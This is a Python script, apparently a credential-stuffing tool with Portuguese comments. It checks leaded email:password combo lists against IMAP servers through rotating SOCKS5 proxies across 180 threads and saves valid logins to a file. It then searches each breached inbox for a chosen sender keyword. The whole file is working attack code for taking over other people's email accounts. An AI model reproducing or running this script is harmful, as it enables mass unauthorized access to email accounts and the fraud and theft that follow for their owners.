import imaplib, concurrent.futures, threading, os, sys, socket, socks, time, random, queue
from colorama import Fore, Style, init

init(autoreset=True)

# --- CONFIGURAÇÕES ---
anasHits, anasBad, anasFound, processados, total_combos = 0, 0, 0, 0, 0
ARQUIVO_PROXIES = "proxy_validos.txt"
lock, stL = threading.Lock(), threading.Lock()
proxy_queue = queue.Queue()

def garantir_arquivo():
    """ Cria o arquivo se ele não existir para evitar crash """
    if not os.path.exists(ARQUIVO_PROXIES):
        with open(ARQUIVO_PROXIES, "w") as f: pass

def carregar_municao():
    """ Puxa os proxies do HD para a RAM sem engasgar """
    try:
        garantir_arquivo()
        with open(ARQUIVO_PROXIES, "r") as f:
            proxies = [l.strip() for l in f.readlines() if ":" in l]
            if not proxies: return False
            while not proxy_queue.empty(): proxy_queue.get()
            for p in proxies: proxy_queue.put(p)
        return True
    except: return False

def uss():
    with stL:
        sys.stdout.write(
            f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {anasHits} | "
            f"{Fore.RED}Bad{Fore.WHITE}: {anasBad} | "
            f"{Fore.CYAN}Found{Fore.WHITE}: {anasFound} | "
            f"{Fore.MAGENTA}Progresso{Fore.WHITE}: {processados}/{total_combos}{Style.RESET_ALL} "
        )
        sys.stdout.flush()

def tlas(combo):
    global anasHits, anasBad, anasFound, processados
    if ':' not in combo: return
    email, password = combo.strip().split(':', 1)
    domain = email.split('@')[1] if '@' in email else None
    if not domain: return

    try:
        proxy = proxy_queue.get(timeout=2)
        proxy_queue.put(proxy) # Rotação contínua
    except:
        carregar_municao()
        return

    try:
        ip, porta = proxy.split(':')
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, ip, int(porta))
        s.settimeout(15)
        
        mail = imaplib.IMAP4_SSL(f"imap.{domain}") 
        mail.sock = s
        mail.sock.connect((f"imap.{domain}", 993))
        mail.file = mail.sock.makefile('rb')
        mail.login(email, password)
        
        with lock:
            with open("IMAP-Valid.txt", 'a', encoding='utf-8') as f: f.write(f"{email}:{password}\n")
        
        with stL:
            anasHits += 1
            processados += 1
            uss()

        mail.select("INBOX")
        typ, data = mail.search(None, f'FROM "{anasKeyword}"')
        if typ == "OK" and data[0].split():
            with lock:
                with open("Inbox-Found.txt", 'a', encoding='utf-8') as f2:
                    f2.write(f"{email}:{password} | Total = {len(data[0].split())}\n")
            with stL:
                anasFound += 1
                uss()
        mail.logout()
    except:
        with stL:
            anasBad += 1
            processados += 1
            uss()

def main():
    os.system("cls" if os.name == "nt" else "clear")
    global anasCombo, anasKeyword, total_combos
    print(f"{Fore.MAGENTA}--- IMPÉRIO MUTANTE | PROTOCOLO ALQUIMIA (ABATEDOR) ---")
    anasCombo = input(" [×] COMBO: ")
    anasKeyword = input(" [×] KEYWORD: ")
    
    try:
        with open(anasCombo, 'r', encoding='utf-8', errors='ignore') as f:
            combos = f.readlines()
            total_combos = len(combos)
    except: return

    print(f"{Fore.YELLOW}[!] Sincronizando com o Caçador...")
    while not carregar_municao():
        time.sleep(3) # Espera o Filtrador injetar o primeiro IP

    with concurrent.futures.ThreadPoolExecutor(max_workers=180) as executor:
        executor.map(tlas, combos)

if __name__ == "__main__":
    main()